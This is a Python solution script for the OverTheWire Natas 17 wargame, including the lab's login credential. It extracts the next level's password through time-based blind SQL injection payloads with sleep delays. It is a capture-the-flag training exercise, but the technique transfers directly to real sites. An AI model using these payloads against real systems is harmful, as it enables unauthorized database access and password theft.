import requests
from requests.auth import HTTPBasicAuth


# some information about the challenge;
# SQLi Blind

url = 'http://natas17.natas.labs.overthewire.org/index.php'
alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
basic_auth = HTTPBasicAuth('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')
header = {'content-type': 'application/x-www-form-urlencoded'}
time_sleep = 4
filtered_chars = ''
pwd = ''
request_sent = 0
request_success = 0

def create_payload(char, is_filter = True) -> str:
	if is_filter:
		return f'username=natas18%22+and+password+like+binary+%27%25{c}%25%27+and+sleep%28{time_sleep}%29+%23' 
	else:
		return f'username=natas18%22%20and%20password%20like%20binary%20\'{char}%25\'%20and%20sleep({time_sleep})%23'
	

for c in alphabet:
	res = requests.post(url, data=create_payload(c), auth=basic_auth, headers=header)
	if res.status_code == 200 and res.elapsed.seconds >= time_sleep:
		filtered_chars += c


for i in range(32):
	for c in filtered_chars:
		res = requests.post(url, data=create_payload(pwd + c, False), auth=basic_auth, headers=header)
		request_sent += 1
		if res.status_code == 200 and res.elapsed.seconds >= time_sleep:
			print(f'Request number: {request_sent} || result: {res.status_code} || time: {res.elapsed.seconds} || payload: {pwd + c}')
			pwd += c
			request_success += 1
			break
		else:
			print(f'Request number: {request_sent} || result: {res.status_code} || time: {res.elapsed.seconds} || payload: {pwd + c}')
		

print(f'password: {pwd}')